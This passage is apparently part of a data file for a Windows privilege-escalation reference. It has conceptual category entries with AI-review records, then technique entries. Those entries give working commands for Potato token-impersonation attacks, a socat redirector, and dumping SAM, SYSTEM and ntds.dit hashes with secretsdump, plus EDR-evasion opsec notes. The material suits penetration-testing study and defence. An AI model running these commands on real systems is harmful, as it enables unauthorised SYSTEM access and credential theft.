            "label": "MITRE, CWE-312: Cleartext Storage of Sensitive Information",
            "section": "Description",
            "url": "https://cwe.mitre.org/data/definitions/312.html"
          }
        ],
        "summary": "Recognize the confidentiality risk of secrets in files and history."
      },
      "claims": [
        {
          "text": "PSReadLine persists command history that can contain passwords and attempts to filter sensitive information; treating the filter as an absolute secrecy guarantee is not supported by this description.",
          "section": "Microsoft, about_PSReadLine — Command History; the conclusion about a guarantee is an editorial inference from the documented limitation",
          "sources": [
            "https://learn.microsoft.com/en-us/powershell/module/psreadline/about/about_psreadline?view=powershell-7.6"
          ]
        },
        {
          "text": "CWE-312 describes sensitive information stored in cleartext in a resource that may be accessible outside the intended control boundary.",
          "section": "MITRE, CWE-312: Cleartext Storage of Sensitive Information — Description",
          "sources": [
            "https://cwe.mitre.org/data/definitions/312.html"
          ]
        }
      ]
    }
  },
  {
    "id": "creds-vaults",
    "label": "Vaults & DPAPI",
    "phase": "finding",
    "kind": "category",
    "summary": "Understand the purpose and scope of DPAPI protection.",
    "description": "DPAPI lets applications encrypt data and adds a keyed integrity check to detect tampering. Decryption normally depends on the same user logon credentials and the same computer, with exceptions documented by Microsoft. A reference to DPAPI therefore describes a protection mechanism; it does not mean that every credential store has identical contents or behavior.",
    "mitre": {
      "id": "T1555.004",
      "url": "https://attack.mitre.org/techniques/T1555/004/"
    },
    "references": [
      {
        "label": "Microsoft, CryptProtectData function",
        "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata",
        "section": "Introduction; Remarks",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "DPAPI lets applications encrypt data and adds a keyed integrity check to detect tampering. Decryption normally depends on the same user logon credentials and the same computer, with exceptions documented by Microsoft. A reference to DPAPI therefore describes a protection mechanism; it does not mean that every credential store has identical contents or behavior.",
        "id": "creds-vaults",
        "kind": "category",
        "label": "Vaults & DPAPI",
        "mitre": {
          "id": "T1555.004",
          "url": "https://attack.mitre.org/techniques/T1555/004/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, CryptProtectData function",
            "section": "Introduction; Remarks",
            "url": "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
          }
        ],
        "summary": "Understand the purpose and scope of DPAPI protection."
      },
      "claims": [
        {
          "text": "CryptProtectData provides data encryption and a keyed integrity check.",
          "section": "Microsoft, CryptProtectData function — Introduction; Remarks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
          ]
        },
        {
          "text": "DPAPI decryption normally requires matching user logon credentials and the same computer, subject to documented exceptions.",
          "section": "Microsoft, CryptProtectData function — Introduction; Remarks",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-services",
    "label": "Service Misconfigurations",
    "phase": "finding",
    "kind": "category",
    "summary": "Separate service-object permissions from the service account.",
    "description": "Windows secures the service control manager and individual service objects through access rights and security descriptors. A running service uses the security context of its configured account, represented by an access token. Permission to manage a service object and the identity under which the service runs are distinct parts of the security model.",
    "mitre": {
      "id": "T1543.003",
      "url": "https://attack.mitre.org/techniques/T1543/003/"
    },
    "references": [
      {
        "label": "Microsoft, Service Security and Access Rights",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights",
        "section": "Introduction; Access Rights for the Service Control Manager; Access Rights for a Service",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Service User Accounts",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts",
        "section": "Introduction",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "Windows secures the service control manager and individual service objects through access rights and security descriptors. A running service uses the security context of its configured account, represented by an access token. Permission to manage a service object and the identity under which the service runs are distinct parts of the security model.",
        "id": "pe-cat-services",
        "kind": "category",
        "label": "Service Misconfigurations",
        "mitre": {
          "id": "T1543.003",
          "url": "https://attack.mitre.org/techniques/T1543/003/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Service Security and Access Rights",
            "section": "Introduction; Access Rights for the Service Control Manager; Access Rights for a Service",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Service User Accounts",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
          }
        ],
        "summary": "Separate service-object permissions from the service account."
      },
      "claims": [
        {
          "text": "The service control manager and individual service objects have separately defined access rights and security descriptors.",
          "section": "Microsoft, Service Security and Access Rights — Introduction; Access Rights for the Service Control Manager; Access Rights for a Service",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights"
          ]
        },
        {
          "text": "The service control manager logs on the service's account and attaches the resulting access token to its process.",
          "section": "Microsoft, Service User Accounts — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-dll",
    "label": "DLL & PATH Hijacking",
    "phase": "finding",
    "kind": "category",
    "summary": "Understand dynamic libraries and their execution context.",
    "description": "A dynamic-link library is a module containing functions and data that other modules can use. Windows maps a loaded DLL into the calling process's virtual address space. An exported DLL function runs in the context of the thread that calls it; the DLL itself does not establish a separate privileged account.",
    "mitre": {
      "id": "T1574.001",
      "url": "https://attack.mitre.org/techniques/T1574/001/"
    },
    "references": [
      {
        "label": "Microsoft, Dynamic-Link Libraries",
        "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries",
        "section": "Introduction",
        "kind": "primary"
      },
      {
        "label": "Microsoft, About Dynamic-Link Libraries",
        "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries",
        "section": "DLLs and Memory Management",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "A dynamic-link library is a module containing functions and data that other modules can use. Windows maps a loaded DLL into the calling process's virtual address space. An exported DLL function runs in the context of the thread that calls it; the DLL itself does not establish a separate privileged account.",
        "id": "pe-cat-dll",
        "kind": "category",
        "label": "DLL & PATH Hijacking",
        "mitre": {
          "id": "T1574.001",
          "url": "https://attack.mitre.org/techniques/T1574/001/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Dynamic-Link Libraries",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries"
          },
          {
            "kind": "primary",
            "label": "Microsoft, About Dynamic-Link Libraries",
            "section": "DLLs and Memory Management",
            "url": "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
          }
        ],
        "summary": "Understand dynamic libraries and their execution context."
      },
      "claims": [
        {
          "text": "A DLL is a module containing functions and data usable by another application or DLL.",
          "section": "Microsoft, Dynamic-Link Libraries — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-libraries"
          ]
        },
        {
          "text": "A loaded DLL occupies the process's virtual address space, and its exported functions run in the calling thread's context.",
          "section": "Microsoft, About Dynamic-Link Libraries — DLLs and Memory Management",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/dlls/about-dynamic-link-libraries"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-tasks",
    "label": "Scheduled Tasks & Autoruns",
    "phase": "finding",
    "kind": "category",
    "summary": "Separate automatic startup from a task's security context.",
    "description": "Task Scheduler registers and runs each task under a specified security context associated with an account or group. Automatic startup also includes mechanisms such as Run and RunOnce registry entries, which launch programs at user logon. Being scheduled or started automatically does not, by itself, describe a program's administrative authority.",
    "mitre": {
      "id": "T1053.005",
      "url": "https://attack.mitre.org/techniques/T1053/005/"
    },
    "references": [
      {
        "label": "Microsoft, Security Contexts for Tasks",
        "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks",
        "section": "Introduction; Specifying Credentials",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Run and RunOnce Registry Keys",
        "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys",
        "section": "Introduction",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "Task Scheduler registers and runs each task under a specified security context associated with an account or group. Automatic startup also includes mechanisms such as Run and RunOnce registry entries, which launch programs at user logon. Being scheduled or started automatically does not, by itself, describe a program's administrative authority.",
        "id": "pe-cat-tasks",
        "kind": "category",
        "label": "Scheduled Tasks & Autoruns",
        "mitre": {
          "id": "T1053.005",
          "url": "https://attack.mitre.org/techniques/T1053/005/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Security Contexts for Tasks",
            "section": "Introduction; Specifying Credentials",
            "url": "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Run and RunOnce Registry Keys",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
          }
        ],
        "summary": "Separate automatic startup from a task's security context."
      },
      "claims": [
        {
          "text": "Scheduled tasks run under a specified security context associated with an account or group.",
          "section": "Microsoft, Security Contexts for Tasks — Introduction; Specifying Credentials",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks"
          ]
        },
        {
          "text": "Run and RunOnce are registry mechanisms for starting programs at user logon.",
          "section": "Microsoft, Run and RunOnce Registry Keys — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-apps",
    "label": "Privileged App & Service Abuse",
    "phase": "finding",
    "kind": "category",
    "summary": "Understand the authority of application and service processes.",
    "description": "Windows represents an application process's security context with an access token that identifies its account and privileges. A service runs with a token for its configured account. Understanding that execution context is part of understanding application security; the presence of an application or service alone does not establish administrative authority.",
    "references": [
      {
        "label": "Microsoft, Access Tokens",
        "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens",
        "section": "Introduction",
        "kind": "primary"
      },
      {
        "label": "Microsoft, Service User Accounts",
        "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts",
        "section": "Introduction",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "Windows represents an application process's security context with an access token that identifies its account and privileges. A service runs with a token for its configured account. Understanding that execution context is part of understanding application security; the presence of an application or service alone does not establish administrative authority.",
        "id": "pe-cat-apps",
        "kind": "category",
        "label": "Privileged App & Service Abuse",
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft, Access Tokens",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          },
          {
            "kind": "primary",
            "label": "Microsoft, Service User Accounts",
            "section": "Introduction",
            "url": "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
          }
        ],
        "summary": "Understand the authority of application and service processes."
      },
      "claims": [
        {
          "text": "An access token identifies the account and privileges associated with a process or thread.",
          "section": "Microsoft, Access Tokens — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"
          ]
        },
        {
          "text": "A service executes in its configured account's security context and receives an access token for that account.",
          "section": "Microsoft, Service User Accounts — Introduction",
          "sources": [
            "https://learn.microsoft.com/en-us/windows/win32/services/service-user-accounts"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-cat-cve",
    "label": "Known Exploits (CVE)",
    "phase": "finding",
    "kind": "category",
    "summary": "Read vulnerability records and severity scores accurately.",
    "description": "A CVE Record describes a vulnerability associated with a CVE identifier and includes affected products, versions, and references. CVSS expresses vulnerability severity; NIST explicitly distinguishes it from risk. A record or score is information for review, not a demonstration of behavior on a particular computer.",
    "mitre": {
      "id": "T1068",
      "url": "https://attack.mitre.org/techniques/T1068/"
    },
    "references": [
      {
        "label": "CVE Program, CVE Record Lifecycle",
        "url": "https://www.cve.org/about/Process",
        "section": "CVE Records",
        "kind": "primary"
      },
      {
        "label": "NIST NVD, Vulnerability Metrics",
        "url": "https://nvd.nist.gov/vuln-metrics/cvss",
        "section": "Introduction",
        "kind": "primary"
      }
    ],
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual claims in this category overview only. Does not cover linked techniques, commands, connection outcomes, or ATT&CK mapping suitability.",
      "reviewedContent": {
        "description": "A CVE Record describes a vulnerability associated with a CVE identifier and includes affected products, versions, and references. CVSS expresses vulnerability severity; NIST explicitly distinguishes it from risk. A record or score is information for review, not a demonstration of behavior on a particular computer.",
        "id": "pe-cat-cve",
        "kind": "category",
        "label": "Known Exploits (CVE)",
        "mitre": {
          "id": "T1068",
          "url": "https://attack.mitre.org/techniques/T1068/"
        },
        "phase": "finding",
        "references": [
          {
            "kind": "primary",
            "label": "CVE Program, CVE Record Lifecycle",
            "section": "CVE Records",
            "url": "https://www.cve.org/about/Process"
          },
          {
            "kind": "primary",
            "label": "NIST NVD, Vulnerability Metrics",
            "section": "Introduction",
            "url": "https://nvd.nist.gov/vuln-metrics/cvss"
          }
        ],
        "summary": "Read vulnerability records and severity scores accurately."
      },
      "claims": [
        {
          "text": "A CVE Record associates an identifier with descriptive vulnerability data, affected products and versions, and references.",
          "section": "CVE Program, CVE Record Lifecycle — CVE Records",
          "sources": [
            "https://www.cve.org/about/Process"
          ]
        },
        {
          "text": "CVSS measures vulnerability severity and is not a measure of risk.",
          "section": "NIST NVD, Vulnerability Metrics — Introduction",
          "sources": [
            "https://nvd.nist.gov/vuln-metrics/cvss"
          ]
        }
      ]
    }
  },

  // ── Token Privileges (whoami /priv) ─────────────────────────────────────────
  {
    id: 'pe-localservice-fullpowers',
    label: 'Restore Service Account Privileges',
    phase: 'svcacct',
    summary: 'Recover a limited service token to its default privileges, including SeImpersonate.',
    affects: 'Works on Windows 10 / Server 2016 to 2019. Reportedly less reliable on Windows 11 / Server 2022 and later; verify on target. If the account already holds SeImpersonate, skip this and go straight to a Potato (GodPotato needs only that privilege).',
    versions: [...range('win10-1507', 'win10-22h2'), 'srv2016', 'srv2019'],
    description: r`A service running as LOCAL SERVICE or NETWORK SERVICE often starts with a heavily filtered token that is missing SeImpersonatePrivilege. The account's default privilege set can be restored by relaunching through the Task Scheduler while explicitly specifying the RequiredPrivileges set on the task principal, which forces the full default privilege set (including SeImpersonate / SeAssignPrimaryToken) into the spawned token, so a Potato attack becomes possible again. (Note: a task with RequiredPrivileges absent recovers everything EXCEPT SeImpersonate, so the explicit list is what does the work.) itm4n's FullPowers automates this, but it was archived (unmaintained) in 2024 and is reportedly less reliable on Windows 11 / Server 2022 and later, so treat it as one tool for the technique, not the technique itself, and verify on target.`,
    tools: [{ name: 'FullPowers', url: 'https://github.com/itm4n/FullPowers' }],
    commands: [
      { label: 'Recover the default privileges', code: r`FullPowers.exe -c "C:\Temp\payload.exe" -z`, lang: 'cmd' },
      { label: 'Confirm SeImpersonate is back', code: r`whoami /priv`, lang: 'cmd' },
    ],
    mitre: mitre('T1134'),
    references: [{ label: 'itm4n, Give Me Back My Privileges', url: 'https://itm4n.github.io/localservice-privileges/' }],
    requires: ['Code execution as LOCAL SERVICE / NETWORK SERVICE', 'Task Scheduler reachable'],
    opsec: 'Spawns a scheduled-task-hosted process; the recovered token then runs Potato tooling, which EDR signatures heavily.',
  },
  {
    id: 'pe-seimpersonate-potato',
    label: 'SeImpersonate / SeAssignPrimaryToken',
    phase: 'hold',
    hub: true,
    summary: 'Hold an impersonation privilege, then pick a Potato variant by Windows build.',
    affects: 'The privilege exists on every version; the working tool is build-specific. JuicyPotato up to Win10 1803 / Server 2016, RoguePotato for 1809 / Server 2019 and later, PrintSpoofer for 1809 / Server 2019 and later where the Print Spooler service is running (often disabled post-PrintNightmare, so lean on RoguePotato/GodPotato for Server 2022+), GodPotato across Windows 8 to 11 and Server 2012 to 2022.',
    description: r`Service accounts (IIS, MSSQL, a relayed login) and many others hold SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. The "Potato" family coerces a SYSTEM-level authentication or RPC call and impersonates the returned token to run code as NT AUTHORITY\SYSTEM. Every variant needs the same privilege; what changes is the coercion trick, which Microsoft has patched piecemeal. Confirm the privilege, then choose the variant that fits the target build and the services it is running.`,
    commands: [{ label: 'Confirm the privilege', code: r`whoami /priv`, lang: 'cmd' }],
    mitre: mitre('T1134.001'),
    references: [
      { label: 'itm4n, abusing impersonation privileges', url: 'https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/' },
      { label: 'jlajara, Potatoes (Windows privesc)', url: 'https://jlajara.gitlab.io/Potatoes_Windows_Privesc' },
    ],
    requires: ['SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege'],
    opsec: 'Potato binaries are heavily signatured by EDR/AV, and each variant has its own tell: RoguePotato produces outbound TCP/135 to a redirector; PrintSpoofer opens the local \\pipe\\spoolss named pipe (no 135 traffic); JuicyPotato/GodPotato do local DCOM activation.',
  },
  {
    id: 'pe-pot-juicypotato',
    label: 'JuicyPotato',
    phase: 'hold',
    summary: 'Abuse a SYSTEM DCOM/BITS CLSID for a SYSTEM token (legacy, pre-1809).',
    affects: 'Windows 7 through 10 1803 and Server 2008 through 2016. Broke on Windows 10 1809 / Server 2019, where the DCOM OXID resolver change removed the local trick.',
    versions: [...range('win7', 'win10-1803'), 'srv2008', 'srv2012', 'srv2016'],
    description: r`The classic local-only Potato, a more flexible RottenPotatoNG that lets you pick any SYSTEM DCOM CLSID. Abuse a SYSTEM-owned DCOM server (BITS and others) by pointing its OXID resolution at a local listener, capture the SYSTEM NTLM authentication, and impersonate it. Needs a CLSID that runs as SYSTEM on the target build; the project ships a per-OS CLSID list. No network egress, so it is still the first pick on older hosts.`,
    tools: [
      { name: 'JuicyPotato', url: 'https://github.com/ohpe/juicy-potato' },
      { name: 'CLSID lists', url: 'https://ohpe.it/juicy-potato/CLSID/' },
    ],
    commands: [
      { label: 'Run with a SYSTEM CLSID for the OS', code: r`JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {CLSID}`, lang: 'cmd' },
    ],
    mitre: mitre('T1134.001'),
    references: [
      { label: 'ohpe (Pierini & Trotta), Juicy Potato (abusing the golden privileges)', url: 'https://ohpe.it/juicy-potato/' },
      { label: 'jlajara, Potatoes', url: 'https://jlajara.gitlab.io/Potatoes_Windows_Privesc' },
    ],
    requires: ['SeImpersonate or SeAssignPrimaryToken', 'A DCOM CLSID that runs as SYSTEM on the target build'],
    opsec: 'A fake DCOM/OXID listener on a local port plus a burst of local NTLM is detectable, and the binary is widely signatured.',
  },
  {
    id: 'pe-pot-printspoofer',
    label: 'PrintSpoofer',
    phase: 'hold',
    summary: 'Coerce the Print Spooler over a named pipe for a SYSTEM token.',
    affects: 'Windows 10/11 and Server 2016 to 2022 wherever the Print Spooler service runs. Fails when Spooler is disabled, which is common post-PrintNightmare hardening.',
    versions: [...range('win10-1507', 'win11-24h2'), 'srv2016', 'srv2019', 'srv2022'],
    description: r`itm4n's replacement for JuicyPotato on 1809 and later. Make the Print Spooler service connect to a named pipe you control, then impersonate the SYSTEM token that arrives. Entirely local with no network redirector, which makes it the simplest option when the Spooler is running.`,
    tools: [{ name: 'PrintSpoofer', url: 'https://github.com/itm4n/PrintSpoofer' }],
    commands: [{ label: 'SYSTEM shell via the Spooler pipe', code: r`PrintSpoofer.exe -i -c cmd.exe`, lang: 'cmd' }],
    mitre: mitre('T1134.001'),
    references: [{ label: 'itm4n, PrintSpoofer', url: 'https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/' }],
    requires: ['SeImpersonatePrivilege (PrintSpoofer checks/enables only this; a SeAssignPrimaryToken-only host needs a different primitive)', 'Print Spooler service running'],
    opsec: 'Named-pipe Spooler coercion and the binary are signatured; many hardened hosts disable the Spooler entirely.',
  },
  {
    id: 'pe-pot-roguepotato',
    label: 'RoguePotato',
    phase: 'hold',
    summary: 'Redirect the DCOM OXID resolver to a remote listener (post-1809).',
    affects: 'Windows 10 1809 and later, Server 2019 and later. Needs a machine you control reachable on port 135 to host the OXID redirector.',
    versions: [...range('win10-1809', 'win11-24h2'), 'srv2019', 'srv2022'],
    description: r`Revives the JuicyPotato approach on builds where the local OXID trick was patched. Point DCOM OXID resolution at a remote redirector on port 135, which forwards back to a local socket, capture the SYSTEM authentication, and impersonate it. The remote port-135 requirement is its main constraint.`,
    tools: [{ name: 'RoguePotato', url: 'https://github.com/antonioCoco/RoguePotato' }],
    commands: [
      { label: 'On your redirector (forward 135 to the target)', code: r`socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999`, lang: 'bash' },
      { label: 'On the target', code: r`RoguePotato.exe -r <redirector_ip> -e "cmd.exe" -l 9999`, lang: 'cmd' },
    ],
    mitre: mitre('T1134.001'),
    references: [
      { label: 'decoder.cloud, No more JuicyPotato? Old story, welcome RoguePotato!', url: 'https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/' },
      { label: 'RoguePotato (antonioCoco)', url: 'https://github.com/antonioCoco/RoguePotato' },
    ],
    requires: ['SeImpersonate or SeAssignPrimaryToken', 'A redirector reachable on port 135'],
    opsec: 'Outbound 135 to an external host is unusual on a workstation and stands out; the binary is signatured.',
  },
  {
    id: 'pe-pot-godpotato',
    label: 'GodPotato',
    phase: 'hold',
    summary: 'rpcss OXID flaw covering Windows 8 to 11 and Server 2012 to 2022.',
    affects: 'Windows 8 through 11 and Server 2012 through 2022, per the project. Local-only, with no redirector or Spooler dependency, which makes it the current default.',
    versions: [...range('win8', 'win11-24h2'), 'srv2012', 'srv2016', 'srv2019', 'srv2022'],
    description: r`A DCOM-based coercion that abuses how the rpcss service handles OXID resolution, working across nearly every supported build with no network redirector and no Print Spooler dependency. Ship the .NET-version-matched binary (NET2 / NET35 / NET4) for the target.`,
    tools: [{ name: 'GodPotato', url: 'https://github.com/BeichenDream/GodPotato' }],
    commands: [{ label: 'SYSTEM command (match .NET to the host)', code: r`GodPotato-NET4.exe -cmd "cmd /c whoami"`, lang: 'cmd' }],
    mitre: mitre('T1134.001'),
    references: [{ label: 'GodPotato (BeichenDream)', url: 'https://github.com/BeichenDream/GodPotato' }],
    requires: ['SeImpersonate or SeAssignPrimaryToken', 'A matching .NET runtime on the host'],
    opsec: 'DCOM activation plus a local NTLM coercion; the binary is signatured, though the local-only footprint is quieter than RoguePotato.',
  },
  {
    "id": "pe-sebackup-restore",
    "label": "SeBackup / SeRestore",
    "phase": "hold",
    "summary": "Distinguish the Windows rights for backup and restoration.",
    "affects": "All supported Windows versions (privilege model).",
    "description": "SeBackupPrivilege and SeRestorePrivilege are separate Windows user rights. Microsoft associates the first with system backup and the second with restoring backed-up files and directories. Their administrative purposes should be distinguished when describing a security configuration.",
    "tools": [
      {
        "name": "diskshadow",
        "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow"
      },
      {
        "name": "impacket-secretsdump",
        "url": "https://github.com/fortra/impacket"
      }
    ],
    "commands": [
      {
        "label": "Copy SAM + SYSTEM hives",
        "code": "reg save HKLM\\SAM C:\\Temp\\sam.hive\nreg save HKLM\\SYSTEM C:\\Temp\\system.hive",
        "lang": "cmd"
      },
      {
        "label": "Extract hashes offline",
        "code": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
        "lang": "bash"
      },
      {
        "label": "DC path: parse ntds.dit with the SYSTEM hive",
        "code": "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL",
        "lang": "bash"
      }
    ],
    "mitre": {
      "id": "T1003.002",
      "url": "https://attack.mitre.org/techniques/T1003/002/"
    },
    "references": [
      {
        "label": "Microsoft — Back up files and directories (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories",
        "kind": "primary"
      },
      {
        "label": "Microsoft — Restore files and directories (archived policy reference)",
        "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories",
        "kind": "primary"
      },
      {
        "label": "HackTricks, Abusing Tokens",
        "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
      },
      {
        "label": "MITRE T1003.003, NTDS (the DC / ntds.dit path)",
        "url": "https://attack.mitre.org/techniques/T1003/003/"
      }
    ],
    "requires": [
      "SeBackupPrivilege (and SeRestorePrivilege for write paths; robocopy /b on the DC path needs both, so with only SeBackup use Copy-FileSeBackupPrivilege (giuliano108) instead)"
    ],
    "opsec": "reg save / diskshadow scripts / VSS snapshot creation are detectable. The privilege may need explicit enabling in the token first.",
    "review": {
      "status": "source-reviewed",
      "reviewedAt": "2026-09-07",
      "reviewedBy": "Codex",
      "reviewerType": "ai",
      "scope": "Selected conceptual Windows privilege definitions and distinctions among privilege assignments, account identity, ownership, driver signing and mandatory integrity. Sources include explicitly labeled archived policy references. Excludes commands, tools, prerequisites, exploit mechanics, applicability, default account assignments, connection outcomes, route viability and ATT&CK mappings. Navigation labels remain project conventions.",
      "reviewedContent": {
        "affects": "All supported Windows versions (privilege model).",
        "commands": [
          {
            "code": "reg save HKLM\\SAM C:\\Temp\\sam.hive\nreg save HKLM\\SYSTEM C:\\Temp\\system.hive",
            "label": "Copy SAM + SYSTEM hives",
            "lang": "cmd"
          },
          {
            "code": "impacket-secretsdump -sam sam.hive -system system.hive LOCAL",
            "label": "Extract hashes offline",
            "lang": "bash"
          },
          {
            "code": "impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL",
            "label": "DC path: parse ntds.dit with the SYSTEM hive",
            "lang": "bash"
          }
        ],
        "description": "SeBackupPrivilege and SeRestorePrivilege are separate Windows user rights. Microsoft associates the first with system backup and the second with restoring backed-up files and directories. Their administrative purposes should be distinguished when describing a security configuration.",
        "id": "pe-sebackup-restore",
        "label": "SeBackup / SeRestore",
        "mitre": {
          "id": "T1003.002",
          "url": "https://attack.mitre.org/techniques/T1003/002/"
        },
        "opsec": "reg save / diskshadow scripts / VSS snapshot creation are detectable. The privilege may need explicit enabling in the token first.",
        "phase": "hold",
        "references": [
          {
            "kind": "primary",
            "label": "Microsoft — Back up files and directories (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories"
          },
          {
            "kind": "primary",
            "label": "Microsoft — Restore files and directories (archived policy reference)",
            "url": "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories"
          },
          {
            "label": "HackTricks, Abusing Tokens",
            "url": "https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens.html"
          },
          {
            "label": "MITRE T1003.003, NTDS (the DC / ntds.dit path)",
            "url": "https://attack.mitre.org/techniques/T1003/003/"
          }
        ],
        "requires": [
          "SeBackupPrivilege (and SeRestorePrivilege for write paths; robocopy /b on the DC path needs both, so with only SeBackup use Copy-FileSeBackupPrivilege (giuliano108) instead)"
        ],
        "summary": "Distinguish the Windows rights for backup and restoration.",
        "tools": [
          {
            "name": "diskshadow",
            "url": "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow"
          },
          {
            "name": "impacket-secretsdump",
            "url": "https://github.com/fortra/impacket"
          }
        ]
      },
      "claims": [
        {
          "text": "SeBackupPrivilege is the Windows user right associated with backing up the system.",
          "section": "Microsoft — Back up files and directories (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories"
          ]
        },
        {
          "text": "SeRestorePrivilege is the Windows user right associated with restoring backed-up files and directories.",
          "section": "Microsoft — Restore files and directories (archived policy reference) — Reference",
          "sources": [
            "https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/restore-files-and-directories"
          ]
        }
      ]
    }
  },
  {
    "id": "pe-sedebug-lsass",
    "label": "SeDebug",
    "phase": "hold",
    "summary": "Understand debugging privileges and process security context.",
    "affects": "All supported Windows versions; on modern builds LSASS may be PPL-protected or Credential Guard-enabled, needing an extra bypass.",
